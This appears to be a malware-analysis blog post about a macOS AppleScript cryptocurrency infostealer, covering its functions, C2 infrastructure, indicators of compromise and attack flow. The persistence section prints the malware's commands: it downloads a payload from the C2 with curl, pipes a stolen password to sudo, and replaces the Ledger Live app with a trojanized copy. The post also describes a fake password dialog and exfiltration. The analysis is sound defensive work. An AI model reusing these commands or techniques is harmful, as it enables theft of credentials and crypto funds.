# EXECUTIVE SUMMARY
This blog provides a comprehensive technical analysis of a sophisticated AppleScript-based cryptocurrency stealer malware observed executing on October 26, 2025. The malware  is a highly capable infostealer specifically designed to target cryptocurrency wallets, browser credentials, and sensitive user data on macOS systems.

**At a Glance: Key Malware Details**

•	Type: Infostealer / Cryptocurrency Stealer / Trojan

•	Trojan Name: "`Salmonela`" (based on temporary file naming) 

•	Primary Delivery: Social engineering via a malicious website hosted at `45.143.203[.]31`(`FakeUpdate, GhoLoader, SocGholish`)

•	Payload Hosting & C2: German server at 144.31.193[.]241, using the domains `secureapimiddleware[.]com` and `gamma.secureapimiddleware[.]com`

•	Initial Access: Victims are tricked into executing a base64-encoded command in the Terminal

•	Bot ID: `f48fbe39836779cadbf148b5952919fd`

The following chart outlines its primary components:
```
main()                        
├── snd_rn()                  # C2 health check
├── getpwd()                  # Password harvesting
│   └── checkvalid()          # Password validation
├── filegrabber()             # Safari, Notes, Files, Keychain theft
├── parseFF()                 # Firefox/Waterfox credential theft
│   └── firewallets()         # Firefox extension wallet theft
│       └── GetUUID()         # Extension ID extraction
├── chromium()                # Chromium-based browser theft
│   └── grabPlugins()         # Extension wallet theft
├── GrabFolder()              # Recursive directory copying
├── send_data()               # Data exfiltration
└── toast()                   # Application trojanization
```
## Credential Harvesting Functions
`
Checkvalid()
`

checkvalid uses `dscl` (Directory Service command line utility) to validate credentials against macOS authentication system. It validates passwords without elevation.

 <img width="940" height="225" alt="image" src="https://github.com/user-attachments/assets/3057b0fd-7770-4ead-9062-ede0c4160022" />

`
getpwd()
`

This function obtains user password through phishing or cached password.  If user has no password (rare on modern macOS), attempts to retrieve Chrome master password from keychain. But this only works if Chrome stores a master password.

For the phishing dialog, it contains a infinite loop until correct password entered, also people may get into the trick “macOS Protection Service”. 

Looks like macOS cant distinguish if the dialog is legitimate or not from the Applescript. Currently, this has been utilized by many different phishing attacks on target macOS.

 <img width="940" height="369" alt="image" src="https://github.com/user-attachments/assets/99a2b6a3-bf67-4412-8893-c818f1c83fff" />

## Network Communications Functions

`snd_rn()`

This function registers infection with the C2 , verify the connectivity.

 <img width="940" height="209" alt="image" src="https://github.com/user-attachments/assets/469d244a-b2a8-405f-9017-0f3f7cf8dac1" />

`send_data()`

It exfiltrates stolen data archive.  As we can see it compresses the stolen data into `/tmp/salmonela.zip`, and then transit to C2 server `https://secureap7imiddleware[.]com/api/data/receive`.

<img width="940" height="194" alt="image" src="https://github.com/user-attachments/assets/f68d763c-4401-4ee5-937f-68c74b377d47" />
 
## Persistence Functions

`toast()`

This function implements a sophisticated application replacement strategy to maintain persistence:

**Function parameters:**

•	`sampleVal`: stolen passwords

•	`anotherVal`: targeted App name ( “Ledger Live” in this script, it is a cryptocurrency wallet application)

•	`thirdVal`: Url to download the malicious file for replacements

•	`fourthVal`: temporary Zip file name

•	`fifthVal`: temporary extraction directory

**Malicious Replacement Strategy**

**Step1: Download Malicious Payload**
```python
curl -L -o & POSIX path of zipFile & & thirdVal &
```
```python
curl -L -o /tmp/lekkjah.zip https://gamma.secureapimiddleware[.]com/7379951eb23e20eacxxxxxxxxx_b_l.php
```
**Step2: Kill Legitimate App (Ledger Live.app)**
```python
pkill -9 & appName &
```
```python
pkill -9 "Ledger Live"
```
Prevents error likes “App is in use” during replacement.

**Step3: Create Extraction Directory**
```python
mkdir -p & POSIX path of extractDir &
```
```python
mkdir -p /temp/lekkoisk
```
**Step4: Extract Malicious Replacement**
```python
unzip -q &  POSIX path of zipFile & -d & POSIX path of extractDir & 
```
```python
unzip -q /tmp/lekkjah.zip -d /tmp/lekkoisk
```
**Step5: Remove macOS Metadata**
```python
rm -r & POSIX path of extractDir & /__MACOSX/ &
```
```python
rm -r  /tmp/lekkoisk/__MACOSX/
```
```python
/tmp/lekkoisk/
├── malicious_replacement.app/          
└── __MACOSX/               
    └── .DS_Store
    └── resource forks
```
Reason for Metadata Removal: Likely to reduce forensic evidence trails.
**Step6: Locate Malicious Replacement Bundle**
```python
find & POSIX path of extractDir & -maxdepth 2 -name *.app -type d | head -1
```
```python
find /tmp/lekkoisk -maxdepth 2 -name *.app -type d | head -1
```
**Step7: Delete Legitimate Application**
```python
"echo \"" & sampleVal & "\" | sudo -S rm -rf " & POSIX path of appPath
```
```python
echo "stolenpwd" | sudo -S rm -rf /Applications/Ledger\ Live.app
```
Pipes the stolen password to sudo and then force delete the legitimate ‘Ledger Live.app’.
**Step8: Install Malicious Replacement**
Apparently should have a command do the copy the malicious replacement.
```python
"echo \"" & sampleVal & "\" | sudo -S cp -r & newAppPath  &   & POSIX path of appPath &
```
```python
echo "StolenPassword123" | sudo -S cp -r /tmp/lekkoisk/malicious_replacement.app /Applications/Ledger\ Live.app
```
**Complete Replacement Flow**
**Summary**:
1.	Kill running process: pkill -9 "Ledger Live"
2.	Delete original: rm -rf /Applications/Ledger\ Live.app
3.	Install malicious: cp -r malicious.app /Applications/Ledger\ Live.app
**Persistence Benefits**:
•	Replaces trusted software with malware
•	Survives reboots and updates
•	Runs with user trust and elevated privileges
 <img width="940" height="416" alt="image" src="https://github.com/user-attachments/assets/986ecaa7-ac6d-479f-b8b7-280a4901950c" />
<img width="940" height="300" alt="image" src="https://github.com/user-attachments/assets/de495606-f889-4948-841b-861047fa74b1" />

## Data Theft Function
`GrabFolder()`

Recursively copy directory contents with exclusions.

**Excluded Files**:

•	.DS_Store - macOS metadata (no value)

•	Cache, GPUCache, etc. - Browser cache files (large, low value)

•	market-history-cache.json - Wallet UI cache (not credentials)

•	tor - Tor browser components (privacy-conscious users)

 <img width="940" height="296" alt="image" src="https://github.com/user-attachments/assets/54457260-3fa0-4b83-a826-a2fbf4344d62" />

`GetUUID()`

Extract Firefox extension UUID from prefs.js (stores configuration and user settings for applications like Mozilla Firefox)

**Targeted Wallets**:

•	MetaMask: `webextension@metamask.io`

•	BNB Chain Wallet: `0a395005-c941-4030-xxxxxxxx`

 <img width="940" height="489" alt="image" src="https://github.com/user-attachments/assets/1853170a-dd99-4780-8b72-ea5f789cbc05" />
 
<img width="940" height="140" alt="image" src="https://github.com/user-attachments/assets/1f45e08c-98d0-4637-9c5f-2f358fe010d8" />

`firewallets()`

Targets theft of cryptocurrency wallet data from Firefox browsers.

**Steals**:

•	MetaMask and BNB Chain Wallet data

•	IndexedDB databases containing private keys and transaction history

•	Wallet configuration and account information

<img width="940" height="354" alt="image" src="https://github.com/user-attachments/assets/20e3bbfd-b839-4f42-b0aa-d7181bdf8768" />

`parseFF() `

Steals Firefox/Waterfox credentials and wallet extensions. The target files includes key4.db and logins.json, if a primary password was not set, the attacker can decrypt ALL Firefox passwords offline both key4.db and logins.json.

<img width="940" height="364" alt="image" src="https://github.com/user-attachments/assets/1b44104c-d0ce-4f3b-a59c-18181e185314" />

<img width="940" height="199" alt="image" src="https://github.com/user-attachments/assets/c2b8650b-f1a0-4f65-8f19-5cac3dd62dfe" />
 
`grabPlugins()`

Targeted theft of specific browser extensions/plugins from Chromium-based browsers. 

 <img width="940" height="430" alt="image" src="https://github.com/user-attachments/assets/b00bce36-e14c-4958-abcf-17055deee6d7" />
 
The pluginList has 200+ extension IDs. 

The grabPlugins has 2 modes, first one steal general extensions (index=false), mode 2 steal indexedDB focused (index=true), mode 2 targets  10 high-value wallet extensions.

`Chromium()`

Steals more comprehensive datafrom ALL Chromium-based browsers on the system. It targets  browsers: Chrome, Brave, Edge, Vivaldi, Opera, Opera GX, Arc, Chromium.

Besides the browser extensions we mentioned above, it also steal 

•	Cookies (sessions, authentication)

•	Saved passwords and login credentials

•	Form data and autofill information

•	Browser history and preferences

<img width="940" height="422" alt="image" src="https://github.com/user-attachments/assets/bd27027a-ca90-40e0-90b5-625f7fe9a77a" />

<img width="940" height="20" alt="image" src="https://github.com/user-attachments/assets/e46def59-6924-4ec8-abb9-14973a9dda63" />

`filegrabber()`

The most complex function in this script. It focus on system-wide file theft targeting Safari Cookies, Safari Autofill, macOS Keychain, Apple Notes, Desktop and Documents Files.

<img width="940" height="437" alt="image" src="https://github.com/user-attachments/assets/8f15efb5-467c-436b-a3b8-6fe062722cab" />

The targets on Apple Notes limits size to 12MB to avoid suspicious large network upload alert.

 <img width="940" height="439" alt="image" src="https://github.com/user-attachments/assets/d951002d-ec6c-457f-8a34-4324f0511f87" />

Also the targets on Documents limits size to 10MB.

<img width="940" height="300" alt="image" src="https://github.com/user-attachments/assets/e0fc5b1f-5634-472f-bf5e-ffa5c445d3a4" />

## Attack flow in Main()

**Phase 1: Initialization & Reconnaissance**

•	Beacons to command & control

•	Identifies current user for targeting

•	Creates temporary workspace

 <img width="940" height="166" alt="image" src="https://github.com/user-attachments/assets/e8d9c2a8-89a5-44e5-8e37-3da3be96e65f" />

**Phase 2: Credential Harvesting**

•	Tests stored passwords from previous theft

•	Steals new credentials via multi-stage theft:

    o	Empty password exploitation
    
    o	Chrome keychain extraction
    
    o	Fake system dialog phishing 

•	Stores for reuse and persistence

 <img width="940" height="100" alt="image" src="https://github.com/user-attachments/assets/dd3c6618-a8bd-4da7-b173-920475b2efb6" />

**Phase 3: System Data Collection**

•	Apple Notes (databases + media files)

•	Safari cookies and form data

•	Keychain databases with all saved passwords

•	Documents (PDF, Word, wallet files, keys)

•	Size-limited to avoid detection

<img width="940" height="144" alt="image" src="https://github.com/user-attachments/assets/580d8e09-c5df-4f0c-a883-d8f81241474a" />

**Phase 4: Browser Ecosystem Compromise**

**Firefox-based Browsers**:

•	Cookies, passwords, form data from all profiles

•	Cryptocurrency wallet extensions (MetaMask, BNB Chain)

•	UUID-based precision targeting

<img width="636" height="109" alt="image" src="https://github.com/user-attachments/assets/2ce27048-33d4-4dc6-b7fe-4111d4ad4309" />

**Chromium-based Browsers**:

•	Core browser data: cookies, passwords, autofill

•	200+ extensions specifically targeted

•	IndexedDB databases with private keys

•	All profiles (Default + custom)

<img width="940" height="163" alt="image" src="https://github.com/user-attachments/assets/240465b9-8327-46a6-b929-2ad6abb87b56" />

**Phase 5: Cryptocurrency Wallet Theft**

**Targets**:

•	Electrum, Coinomi, Exodus, Atomic, Wasabi

•	Ledger Live, Monero, Bitcoin Core, Litecoin Core

•	Dogecoin, Trezor Suite, Guarda, Electron Cash

<img width="940" height="57" alt="image" src="https://github.com/user-attachments/assets/e0c2700e-4db5-40b4-8c30-5ca751f1d3e6" />

<img width="940" height="125" alt="image" src="https://github.com/user-attachments/assets/1a0c42b8-67a8-40ba-99aa-27e075502fd8" />

**Phase 6: Data Exfiltration & Cleanup**

•	Compresses all stolen data into archive

•	Exfiltrates to C2 server with persistent retries

•	Complete cleanup of local evidence

<img width="940" height="58" alt="image" src="https://github.com/user-attachments/assets/73a2d755-923d-4b7b-b25d-64450541599b" />

**Phase 7: Persistence Establishment**

•	Downloads malicious Ledger Live replacement

•	Kills legitimate application

•	Replaces with trojanized version

•	Uses stolen passwords for sudo privileges

<img width="940" height="58" alt="image" src="https://github.com/user-attachments/assets/2829166b-ec4a-492a-94fb-a2a3d95ca8be" />


## Indicators of Compromise (IoCs)

**Network Indicators**

•	C2 Domain: secureapimiddleware.com 

•	IP Address: 144.31.193[.]241, 45.143.203[.]31

•	C2 Endpoints:

o	/strix/index.php

o	/api/data/receive

o	/7379951eb23e20eacxxxxxxxxx_b_l.php

**File System Indicators**

•	/tmp/salmonela.zip - Exfiltration archive

•	/tmp/lekkjah.zip - Malicious replacement download

•	/tmp/lekkoisk/ - Extraction directory

**Process Indicators**

•	Suspicious curl commands with piped bash

•	base64 -d | bash execution pattern

•	Unauthorized dscl usage for credential validation

•	Suspicious pkill -9 followed by application replacement

# Conclusion

This AppleScript malware represents a sophisticated threat to macOS users, particularly those involved in cryptocurrency. The malware demonstrates:

•	Advanced Social Engineering: Leveraging macOS's trust in AppleScript dialogs

•	Comprehensive Data Theft: Targeting browsers, wallets, credentials, and documents

•	Robust Persistence: Application replacement ensuring long-term access

•	Operational Security: Size limits and cleanup to avoid detection
